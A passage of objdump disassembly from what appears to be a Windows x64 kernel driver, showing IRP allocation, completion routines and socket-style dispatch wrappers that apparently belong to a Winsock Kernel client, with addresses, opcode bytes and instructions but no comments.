   140002cb2:	48 85 f6             	test   %rsi,%rsi
   140002cb5:	74 4b                	je     0x140002d02
   140002cb7:	4c 8b f6             	mov    %rsi,%r14
   140002cba:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002cbf:	48 ff c6             	inc    %rsi
   140002cc2:	2b de                	sub    %esi,%ebx
   140002cc4:	48 8b d6             	mov    %rsi,%rdx
   140002cc7:	48 63 db             	movslq %ebx,%rbx
   140002cca:	4c 8b c3             	mov    %rbx,%r8
   140002ccd:	e8 6e 45 00 00       	call   0x140007240
   140002cd2:	48 83 fb 14          	cmp    $0x14,%rbx
   140002cd6:	0f 83 a4 00 00 00    	jae    0x140002d80
   140002cdc:	48 8d 8f 00 02 00 00 	lea    0x200(%rdi),%rcx
   140002ce3:	c6 44 1c 20 00       	movb   $0x0,0x20(%rsp,%rbx,1)
   140002ce8:	4c 8b c3             	mov    %rbx,%r8
   140002ceb:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002cf0:	e8 4b 45 00 00       	call   0x140007240
   140002cf5:	c6 84 3b 00 02 00 00 	movb   $0x0,0x200(%rbx,%rdi,1)
   140002cfc:	00 
   140002cfd:	49 8b de             	mov    %r14,%rbx
   140002d00:	eb 1a                	jmp    0x140002d1c
   140002d02:	0f b7 05 17 48 00 00 	movzwl 0x4817(%rip),%eax        # 0x140007520
   140002d09:	66 89 87 00 02 00 00 	mov    %ax,0x200(%rdi)
   140002d10:	8a 05 0c 48 00 00    	mov    0x480c(%rip),%al        # 0x140007522
   140002d16:	88 87 02 02 00 00    	mov    %al,0x202(%rdi)
   140002d1c:	2b dd                	sub    %ebp,%ebx
   140002d1e:	48 8d 8f 10 02 00 00 	lea    0x210(%rdi),%rcx
   140002d25:	41 be 00 02 00 00    	mov    $0x200,%r14d
   140002d2b:	48 8b d5             	mov    %rbp,%rdx
   140002d2e:	41 3b de             	cmp    %r14d,%ebx
   140002d31:	41 0f 4f de          	cmovg  %r14d,%ebx
   140002d35:	48 63 f3             	movslq %ebx,%rsi
   140002d38:	4c 8b c6             	mov    %rsi,%r8
   140002d3b:	e8 00 45 00 00       	call   0x140007240
   140002d40:	41 3b de             	cmp    %r14d,%ebx
   140002d43:	7d 0a                	jge    0x140002d4f
   140002d45:	c6 84 3e 10 02 00 00 	movb   $0x0,0x210(%rsi,%rdi,1)
   140002d4c:	00 
   140002d4d:	eb 07                	jmp    0x140002d56
   140002d4f:	c6 87 0f 04 00 00 00 	movb   $0x0,0x40f(%rdi)
   140002d56:	b0 01                	mov    $0x1,%al
   140002d58:	48 8b 8c 24 40 04 00 	mov    0x440(%rsp),%rcx
   140002d5f:	00 
   140002d60:	48 33 cc             	xor    %rsp,%rcx
   140002d63:	e8 c8 42 00 00       	call   0x140007030
   140002d68:	4c 8d 9c 24 50 04 00 	lea    0x450(%rsp),%r11
   140002d6f:	00 
   140002d70:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140002d74:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   140002d78:	49 8b e3             	mov    %r11,%rsp
   140002d7b:	41 5e                	pop    %r14
   140002d7d:	5f                   	pop    %rdi
   140002d7e:	5e                   	pop    %rsi
   140002d7f:	c3                   	ret
   140002d80:	e8 fb 42 00 00       	call   0x140007080
   140002d85:	cc                   	int3
   140002d86:	cc                   	int3
   140002d87:	cc                   	int3
   140002d88:	40 53                	rex push %rbx
   140002d8a:	48 83 ec 20          	sub    $0x20,%rsp
   140002d8e:	45 33 c0             	xor    %r8d,%r8d
   140002d91:	48 8b d9             	mov    %rcx,%rbx
   140002d94:	41 8d 50 01          	lea    0x1(%r8),%edx
   140002d98:	ff 15 42 53 00 00    	call   *0x5342(%rip)        # 0x1400080e0
   140002d9e:	33 d2                	xor    %edx,%edx
   140002da0:	b1 01                	mov    $0x1,%cl
   140002da2:	ff 15 48 53 00 00    	call   *0x5348(%rip)        # 0x1400080f0
   140002da8:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140002dac:	48 85 c0             	test   %rax,%rax
   140002daf:	75 07                	jne    0x140002db8
   140002db1:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   140002db6:	eb 1c                	jmp    0x140002dd4
   140002db8:	48 8b 80 b8 00 00 00 	mov    0xb8(%rax),%rax
   140002dbf:	48 8d 0d 1a 00 00 00 	lea    0x1a(%rip),%rcx        # 0x140002de0
   140002dc6:	48 89 48 f0          	mov    %rcx,-0x10(%rax)
   140002dca:	48 89 58 f8          	mov    %rbx,-0x8(%rax)
   140002dce:	c6 40 bb e0          	movb   $0xe0,-0x45(%rax)
   140002dd2:	33 c0                	xor    %eax,%eax
   140002dd4:	48 83 c4 20          	add    $0x20,%rsp
   140002dd8:	5b                   	pop    %rbx
   140002dd9:	c3                   	ret
   140002dda:	cc                   	int3
   140002ddb:	cc                   	int3
   140002ddc:	cc                   	int3
   140002ddd:	cc                   	int3
   140002dde:	cc                   	int3
   140002ddf:	cc                   	int3
   140002de0:	48 83 ec 28          	sub    $0x28,%rsp
   140002de4:	49 8b c8             	mov    %r8,%rcx
   140002de7:	33 d2                	xor    %edx,%edx
   140002de9:	45 33 c0             	xor    %r8d,%r8d
   140002dec:	ff 15 26 55 00 00    	call   *0x5526(%rip)        # 0x140008318
   140002df2:	b8 16 00 00 c0       	mov    $0xc0000016,%eax
   140002df7:	48 83 c4 28          	add    $0x28,%rsp
   140002dfb:	c3                   	ret
   140002dfc:	40 53                	rex push %rbx
   140002dfe:	48 83 ec 20          	sub    $0x20,%rsp
   140002e02:	48 8b d9             	mov    %rcx,%rbx
   140002e05:	ff 15 6d 53 00 00    	call   *0x536d(%rip)        # 0x140008178
   140002e0b:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140002e0f:	ba 01 00 00 c0       	mov    $0xc0000001,%edx
   140002e14:	ff 15 86 53 00 00    	call   *0x5386(%rip)        # 0x1400081a0
   140002e1a:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140002e1e:	48 8b 90 b8 00 00 00 	mov    0xb8(%rax),%rdx
   140002e25:	48 8d 05 b4 ff ff ff 	lea    -0x4c(%rip),%rax        # 0x140002de0
   140002e2c:	48 89 42 f0          	mov    %rax,-0x10(%rdx)
   140002e30:	48 89 5a f8          	mov    %rbx,-0x8(%rdx)
   140002e34:	c6 42 bb e0          	movb   $0xe0,-0x45(%rdx)
   140002e38:	48 83 c4 20          	add    $0x20,%rsp
   140002e3c:	5b                   	pop    %rbx
   140002e3d:	c3                   	ret
   140002e3e:	cc                   	int3
   140002e3f:	cc                   	int3
   140002e40:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002e45:	57                   	push   %rdi
   140002e46:	48 83 ec 30          	sub    $0x30,%rsp
   140002e4a:	8b 02                	mov    (%rdx),%eax
   140002e4c:	48 8b da             	mov    %rdx,%rbx
   140002e4f:	48 8b f9             	mov    %rcx,%rdi
   140002e52:	3d 03 01 00 00       	cmp    $0x103,%eax
   140002e57:	75 1d                	jne    0x140002e76
   140002e59:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140002e5f:	45 33 c9             	xor    %r9d,%r9d
   140002e62:	45 33 c0             	xor    %r8d,%r8d
   140002e65:	33 d2                	xor    %edx,%edx
   140002e67:	ff 15 7b 52 00 00    	call   *0x527b(%rip)        # 0x1400080e8
   140002e6d:	48 8b 47 18          	mov    0x18(%rdi),%rax
   140002e71:	8b 40 30             	mov    0x30(%rax),%eax
   140002e74:	89 03                	mov    %eax,(%rbx)
   140002e76:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140002e7b:	48 83 c4 30          	add    $0x30,%rsp
   140002e7f:	5f                   	pop    %rdi
   140002e80:	c3                   	ret
   140002e81:	cc                   	int3
   140002e82:	cc                   	int3
   140002e83:	cc                   	int3
   140002e84:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002e89:	57                   	push   %rdi
   140002e8a:	48 83 ec 20          	sub    $0x20,%rsp
   140002e8e:	48 8b f9             	mov    %rcx,%rdi
   140002e91:	48 85 c9             	test   %rcx,%rcx
   140002e94:	74 58                	je     0x140002eee
   140002e96:	ff 15 2c 53 00 00    	call   *0x532c(%rip)        # 0x1400081c8
   140002e9c:	84 c0                	test   %al,%al
   140002e9e:	74 4e                	je     0x140002eee
   140002ea0:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   140002ea4:	e8 53 ff ff ff       	call   0x140002dfc
   140002ea9:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140002ead:	48 8b 57 28          	mov    0x28(%rdi),%rdx
   140002eb1:	48 8b 0f             	mov    (%rdi),%rcx
   140002eb4:	48 8b 40 08          	mov    0x8(%rax),%rax
   140002eb8:	ff 15 aa 54 00 00    	call   *0x54aa(%rip)        # 0x140008368
   140002ebe:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002ec3:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140002ec7:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   140002ecb:	e8 70 ff ff ff       	call   0x140002e40
   140002ed0:	48 8b 4f 28          	mov    0x28(%rdi),%rcx
   140002ed4:	ff 15 2e 52 00 00    	call   *0x522e(%rip)        # 0x140008108
   140002eda:	ba 4b 73 64 77       	mov    $0x7764734b,%edx
   140002edf:	48 8b cf             	mov    %rdi,%rcx
   140002ee2:	ff 15 20 54 00 00    	call   *0x5420(%rip)        # 0x140008308
   140002ee8:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140002eec:	eb 05                	jmp    0x140002ef3
   140002eee:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   140002ef3:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140002ef8:	48 83 c4 20          	add    $0x20,%rsp
   140002efc:	5f                   	pop    %rdi
   140002efd:	c3                   	ret
   140002efe:	cc                   	int3
   140002eff:	cc                   	int3
   140002f00:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002f05:	55                   	push   %rbp
   140002f06:	56                   	push   %rsi
   140002f07:	57                   	push   %rdi
   140002f08:	48 83 ec 50          	sub    $0x50,%rsp
   140002f0c:	48 8b 05 cd 71 00 00 	mov    0x71cd(%rip),%rax        # 0x14000a0e0
   140002f13:	48 33 c4             	xor    %rsp,%rax
   140002f16:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140002f1b:	48 8b f2             	mov    %rdx,%rsi
   140002f1e:	48 8b d9             	mov    %rcx,%rbx
   140002f21:	48 85 c9             	test   %rcx,%rcx
   140002f24:	0f 84 93 00 00 00    	je     0x140002fbd
   140002f2a:	ff 15 98 52 00 00    	call   *0x5298(%rip)        # 0x1400081c8
   140002f30:	84 c0                	test   %al,%al
   140002f32:	0f 84 85 00 00 00    	je     0x140002fbd
   140002f38:	48 8d 7b 10          	lea    0x10(%rbx),%rdi
   140002f3c:	48 8b cf             	mov    %rdi,%rcx
   140002f3f:	e8 b8 fe ff ff       	call   0x140002dfc
   140002f44:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140002f48:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   140002f4d:	4c 8b 4b 28          	mov    0x28(%rbx),%r9
   140002f51:	45 33 c0             	xor    %r8d,%r8d
   140002f54:	48 8b 0b             	mov    (%rbx),%rcx
   140002f57:	48 c7 44 24 38 02 00 	movq   $0x2,0x38(%rsp)
   140002f5e:	00 00 
   140002f60:	48 8b 40 10          	mov    0x10(%rax),%rax
   140002f64:	ff 15 fe 53 00 00    	call   *0x53fe(%rip)        # 0x140008368
   140002f6a:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002f6f:	48 8b cf             	mov    %rdi,%rcx
   140002f72:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140002f76:	e8 c5 fe ff ff       	call   0x140002e40
   140002f7b:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140002f7f:	85 c0                	test   %eax,%eax
   140002f81:	78 3f                	js     0x140002fc2
   140002f83:	48 8b cf             	mov    %rdi,%rcx
   140002f86:	e8 71 fe ff ff       	call   0x140002dfc
   140002f8b:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140002f8f:	45 33 c0             	xor    %r8d,%r8d
   140002f92:	4c 8b 4b 28          	mov    0x28(%rbx),%r9
   140002f96:	48 8b d6             	mov    %rsi,%rdx
   140002f99:	48 8b 0b             	mov    (%rbx),%rcx
   140002f9c:	48 8b 40 18          	mov    0x18(%rax),%rax
   140002fa0:	ff 15 c2 53 00 00    	call   *0x53c2(%rip)        # 0x140008368
   140002fa6:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002fab:	48 8b cf             	mov    %rdi,%rcx
   140002fae:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140002fb2:	e8 89 fe ff ff       	call   0x140002e40
   140002fb7:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140002fbb:	eb 05                	jmp    0x140002fc2
   140002fbd:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   140002fc2:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140002fc7:	48 33 cc             	xor    %rsp,%rcx
   140002fca:	e8 61 40 00 00       	call   0x140007030
   140002fcf:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140002fd6:	00 
   140002fd7:	48 83 c4 50          	add    $0x50,%rsp
   140002fdb:	5f                   	pop    %rdi
   140002fdc:	5e                   	pop    %rsi
   140002fdd:	5d                   	pop    %rbp
   140002fde:	c3                   	ret
   140002fdf:	cc                   	int3
   140002fe0:	48 83 ec 38          	sub    $0x38,%rsp
   140002fe4:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   140002feb:	00 
   140002fec:	e8 07 00 00 00       	call   0x140002ff8
   140002ff1:	48 83 c4 38          	add    $0x38,%rsp
   140002ff5:	c3                   	ret
   140002ff6:	cc                   	int3
   140002ff7:	cc                   	int3
   140002ff8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002ffd:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140003002:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003007:	57                   	push   %rdi
   140003008:	41 56                	push   %r14
   14000300a:	41 57                	push   %r15
   14000300c:	48 83 ec 70          	sub    $0x70,%rsp
   140003010:	45 0f b7 f0          	movzwl %r8w,%r14d
   140003014:	44 0f b7 fa          	movzwl %dx,%r15d
   140003018:	48 8b f1             	mov    %rcx,%rsi
   14000301b:	ba 30 00 00 00       	mov    $0x30,%edx
   140003020:	33 c9                	xor    %ecx,%ecx
   140003022:	41 b8 4b 73 64 77    	mov    $0x7764734b,%r8d
   140003028:	41 8b e9             	mov    %r9d,%ebp
   14000302b:	ff 15 df 52 00 00    	call   *0x52df(%rip)        # 0x140008310
   140003031:	48 8b d8             	mov    %rax,%rbx
   140003034:	48 85 c0             	test   %rax,%rax
   140003037:	0f 84 a8 00 00 00    	je     0x1400030e5
   14000303d:	48 8b c8             	mov    %rax,%rcx
   140003040:	ff 15 82 51 00 00    	call   *0x5182(%rip)        # 0x1400081c8
   140003046:	84 c0                	test   %al,%al
   140003048:	0f 84 97 00 00 00    	je     0x1400030e5
   14000304e:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
   140003052:	e8 31 fd ff ff       	call   0x140002d88
   140003057:	85 c0                	test   %eax,%eax
   140003059:	0f 88 8b 00 00 00    	js     0x1400030ea
   14000305f:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   140003063:	44 8b cd             	mov    %ebp,%r9d
   140003066:	8b 94 24 b0 00 00 00 	mov    0xb0(%rsp),%edx
   14000306d:	45 0f b7 c6          	movzwl %r14w,%r8d
   140003071:	48 8b 05 40 b1 00 00 	mov    0xb140(%rip),%rax        # 0x14000e1b8
   140003078:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   14000307d:	48 83 64 24 48 00    	andq   $0x0,0x48(%rsp)
   140003083:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   140003089:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000308f:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140003095:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   14000309b:	48 8b 40 08          	mov    0x8(%rax),%rax
   14000309f:	48 8b 0d 0a b1 00 00 	mov    0xb10a(%rip),%rcx        # 0x14000e1b0
   1400030a6:	89 54 24 20          	mov    %edx,0x20(%rsp)
   1400030aa:	41 0f b7 d7          	movzwl %r15w,%edx
   1400030ae:	ff 15 b4 52 00 00    	call   *0x52b4(%rip)        # 0x140008368
   1400030b4:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1400030b9:	89 44 24 60          	mov    %eax,0x60(%rsp)
   1400030bd:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
   1400030c1:	e8 7a fd ff ff       	call   0x140002e40
   1400030c6:	8b 44 24 60          	mov    0x60(%rsp),%eax
   1400030ca:	85 c0                	test   %eax,%eax
   1400030cc:	78 1c                	js     0x1400030ea
   1400030ce:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   1400030d2:	48 8b 49 38          	mov    0x38(%rcx),%rcx
   1400030d6:	48 89 0b             	mov    %rcx,(%rbx)
   1400030d9:	48 8b 09             	mov    (%rcx),%rcx
   1400030dc:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   1400030e0:	48 89 1e             	mov    %rbx,(%rsi)
   1400030e3:	eb 05                	jmp    0x1400030ea
   1400030e5:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   1400030ea:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   1400030ef:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   1400030f3:	49 8b 6b 28          	mov    0x28(%r11),%rbp
   1400030f7:	49 8b 73 30          	mov    0x30(%r11),%rsi
   1400030fb:	49 8b e3             	mov    %r11,%rsp
   1400030fe:	41 5f                	pop    %r15
   140003100:	41 5e                	pop    %r14
   140003102:	5f                   	pop    %rdi
   140003103:	c3                   	ret
   140003104:	48 83 ec 28          	sub    $0x28,%rsp
   140003108:	48 8d 0d 89 b0 00 00 	lea    0xb089(%rip),%rcx        # 0x14000e198
   14000310f:	e8 f8 3e 00 00       	call   0x14000700c
   140003114:	48 8d 0d 7d b0 00 00 	lea    0xb07d(%rip),%rcx        # 0x14000e198
   14000311b:	48 83 c4 28          	add    $0x28,%rsp
   14000311f:	e9 ee 3e 00 00       	jmp    0x140007012
   140003124:	48 8b 05 8d b0 00 00 	mov    0xb08d(%rip),%rax        # 0x14000e1b8
   14000312b:	48 8b d1             	mov    %rcx,%rdx
   14000312e:	48 8b 0d 7b b0 00 00 	mov    0xb07b(%rip),%rcx        # 0x14000e1b0
   140003135:	48 8b 40 28          	mov    0x28(%rax),%rax
   140003139:	48 ff 25 28 52 00 00 	rex.W jmp *0x5228(%rip)        # 0x140008368
   140003140:	48 8b c4             	mov    %rsp,%rax
   140003143:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140003147:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000314b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000314f:	57                   	push   %rdi
   140003150:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140003157:	48 8b e9             	mov    %rcx,%rbp
   14000315a:	49 8b d9             	mov    %r9,%rbx
   14000315d:	48 8d 48 d0          	lea    -0x30(%rax),%rcx
   140003161:	49 8b f8             	mov    %r8,%rdi
   140003164:	48 8b f2             	mov    %rdx,%rsi
   140003167:	e8 1c fc ff ff       	call   0x140002d88
   14000316c:	33 d2                	xor    %edx,%edx
   14000316e:	85 c0                	test   %eax,%eax
   140003170:	78 6c                	js     0x1400031de
   140003172:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   140003179:	00 
   14000317a:	45 33 c9             	xor    %r9d,%r9d
   14000317d:	48 8b 05 34 b0 00 00 	mov    0xb034(%rip),%rax        # 0x14000e1b8
   140003184:	4c 8b c6             	mov    %rsi,%r8
   140003187:	48 89 4c 24 48       	mov    %rcx,0x48(%rsp)
   14000318c:	48 8b 0d 1d b0 00 00 	mov    0xb01d(%rip),%rcx        # 0x14000e1b0
   140003193:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   140003198:	48 8b 40 20          	mov    0x20(%rax),%rax
   14000319c:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   1400031a1:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400031a6:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   1400031ab:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   1400031b0:	48 8b d5             	mov    %rbp,%rdx
   1400031b3:	ff 15 af 51 00 00    	call   *0x51af(%rip)        # 0x140008368
   1400031b9:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1400031be:	89 44 24 60          	mov    %eax,0x60(%rsp)
   1400031c2:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   1400031c7:	e8 74 fc ff ff       	call   0x140002e40
   1400031cc:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   1400031d3:	00 
   1400031d4:	ff 15 2e 4f 00 00    	call   *0x4f2e(%rip)        # 0x140008108
   1400031da:	8b 44 24 60          	mov    0x60(%rsp),%eax
   1400031de:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   1400031e5:	00 
   1400031e6:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   1400031ea:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   1400031ee:	49 8b 73 20          	mov    0x20(%r11),%rsi
   1400031f2:	49 8b e3             	mov    %r11,%rsp
   1400031f5:	5f                   	pop    %rdi
   1400031f6:	c3                   	ret
   1400031f7:	cc                   	int3
   1400031f8:	48 83 ec 38          	sub    $0x38,%rsp
   1400031fc:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140003202:	48 8d 05 0f 6e 00 00 	lea    0x6e0f(%rip),%rax        # 0x14000a018
   140003209:	48 8d 15 88 af 00 00 	lea    0xaf88(%rip),%rdx        # 0x14000e198
   140003210:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003215:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000321a:	e8 e1 3d 00 00       	call   0x140007000
   14000321f:	85 c0                	test   %eax,%eax
   140003221:	78 16                	js     0x140003239
   140003223:	4c 8d 05 86 af 00 00 	lea    0xaf86(%rip),%r8        # 0x14000e1b0
   14000322a:	83 ca ff             	or     $0xffffffff,%edx
   14000322d:	48 8d 0d 64 af 00 00 	lea    0xaf64(%rip),%rcx        # 0x14000e198
   140003234:	e8 cd 3d 00 00       	call   0x140007006
   140003239:	48 83 c4 38          	add    $0x38,%rsp
   14000323d:	c3                   	ret
   14000323e:	cc                   	int3
   14000323f:	cc                   	int3
   140003240:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003245:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000324a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000324f:	57                   	push   %rdi
   140003250:	48 83 ec 30          	sub    $0x30,%rsp
   140003254:	41 8b f9             	mov    %r9d,%edi
   140003257:	49 8b f0             	mov    %r8,%rsi
   14000325a:	48 8b ea             	mov    %rdx,%rbp
   14000325d:	48 8b d9             	mov    %rcx,%rbx
   140003260:	48 85 c9             	test   %rcx,%rcx
   140003263:	74 22                	je     0x140003287
   140003265:	ff 15 5d 4f 00 00    	call   *0x4f5d(%rip)        # 0x1400081c8
   14000326b:	84 c0                	test   %al,%al
   14000326d:	74 18                	je     0x140003287
   14000326f:	44 8b cf             	mov    %edi,%r9d
   140003272:	c6 44 24 20 00       	movb   $0x0,0x20(%rsp)
   140003277:	4c 8b c6             	mov    %rsi,%r8
   14000327a:	48 8b d5             	mov    %rbp,%rdx
   14000327d:	48 8b cb             	mov    %rbx,%rcx
   140003280:	e8 33 00 00 00       	call   0x1400032b8
   140003285:	eb 05                	jmp    0x14000328c
   140003287:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   14000328c:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140003291:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140003296:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000329b:	48 83 c4 30          	add    $0x30,%rsp
   14000329f:	5f                   	pop    %rdi
   1400032a0:	c3                   	ret
   1400032a1:	cc                   	int3
   1400032a2:	cc                   	int3
   1400032a3:	cc                   	int3
   1400032a4:	48 83 ec 38          	sub    $0x38,%rsp
   1400032a8:	c6 44 24 20 01       	movb   $0x1,0x20(%rsp)
   1400032ad:	e8 06 00 00 00       	call   0x1400032b8
   1400032b2:	48 83 c4 38          	add    $0x38,%rsp
   1400032b6:	c3                   	ret
   1400032b7:	cc                   	int3
   1400032b8:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400032bd:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400032c2:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400032c7:	41 56                	push   %r14
   1400032c9:	48 83 ec 50          	sub    $0x50,%rsp
   1400032cd:	45 8b f1             	mov    %r9d,%r14d
   1400032d0:	49 8b f0             	mov    %r8,%rsi
   1400032d3:	48 8b fa             	mov    %rdx,%rdi
   1400032d6:	48 8b d9             	mov    %rcx,%rbx
   1400032d9:	48 85 c9             	test   %rcx,%rcx
   1400032dc:	0f 84 c0 00 00 00    	je     0x1400033a2
   1400032e2:	ff 15 e0 4e 00 00    	call   *0x4ee0(%rip)        # 0x1400081c8
   1400032e8:	84 c0                	test   %al,%al
   1400032ea:	0f 84 b2 00 00 00    	je     0x1400033a2
   1400032f0:	83 64 24 38 00       	andl   $0x0,0x38(%rsp)
   1400032f5:	8b 06                	mov    (%rsi),%eax
   1400032f7:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400032fc:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140003302:	45 33 c9             	xor    %r9d,%r9d
   140003305:	45 33 c0             	xor    %r8d,%r8d
   140003308:	8b d0                	mov    %eax,%edx
   14000330a:	48 8b cf             	mov    %rdi,%rcx
   14000330d:	ff 15 7d 4e 00 00    	call   *0x4e7d(%rip)        # 0x140008190
   140003313:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140003318:	33 d2                	xor    %edx,%edx
   14000331a:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   14000331e:	48 8b c8             	mov    %rax,%rcx
   140003321:	ff 15 59 4e 00 00    	call   *0x4e59(%rip)        # 0x140008180
   140003327:	90                   	nop
   140003328:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
   14000332c:	e8 cb fa ff ff       	call   0x140002dfc
   140003331:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140003335:	4c 8b 4b 28          	mov    0x28(%rbx),%r9
   140003339:	48 8b 0b             	mov    (%rbx),%rcx
   14000333c:	45 8b c6             	mov    %r14d,%r8d
   14000333f:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140003344:	80 bc 24 80 00 00 00 	cmpb   $0x0,0x80(%rsp)
   14000334b:	00 
   14000334c:	74 06                	je     0x140003354
   14000334e:	48 8b 40 30          	mov    0x30(%rax),%rax
   140003352:	eb 04                	jmp    0x140003358
   140003354:	48 8b 40 38          	mov    0x38(%rax),%rax
   140003358:	ff 15 0a 50 00 00    	call   *0x500a(%rip)        # 0x140008368
   14000335e:	89 44 24 60          	mov    %eax,0x60(%rsp)
   140003362:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140003367:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
   14000336b:	e8 d0 fa ff ff       	call   0x140002e40
   140003370:	8b 7c 24 60          	mov    0x60(%rsp),%edi
   140003374:	85 ff                	test   %edi,%edi
   140003376:	78 09                	js     0x140003381
   140003378:	48 8b 43 28          	mov    0x28(%rbx),%rax
   14000337c:	8b 48 38             	mov    0x38(%rax),%ecx
   14000337f:	89 0e                	mov    %ecx,(%rsi)
   140003381:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140003386:	ff 15 fc 4d 00 00    	call   *0x4dfc(%rip)        # 0x140008188
   14000338c:	eb 05                	jmp    0x140003393
   14000338e:	bf 05 00 00 c0       	mov    $0xc0000005,%edi
   140003393:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140003398:	ff 15 fa 4d 00 00    	call   *0x4dfa(%rip)        # 0x140008198
   14000339e:	8b c7                	mov    %edi,%eax
   1400033a0:	eb 05                	jmp    0x1400033a7
   1400033a2:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   1400033a7:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   1400033ac:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   1400033b1:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   1400033b6:	48 83 c4 50          	add    $0x50,%rsp
   1400033ba:	41 5e                	pop    %r14
   1400033bc:	c3                   	ret
   1400033bd:	cc                   	int3
   1400033be:	cc                   	int3
   1400033bf:	cc                   	int3
   1400033c0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400033c5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1400033ca:	56                   	push   %rsi
   1400033cb:	57                   	push   %rdi
   1400033cc:	41 56                	push   %r14
   1400033ce:	48 83 ec 60          	sub    $0x60,%rsp
   1400033d2:	49 8b f1             	mov    %r9,%rsi
   1400033d5:	41 8b e8             	mov    %r8d,%ebp
   1400033d8:	44 8b f2             	mov    %edx,%r14d
   1400033db:	48 8b f9             	mov    %rcx,%rdi
   1400033de:	48 85 c9             	test   %rcx,%rcx
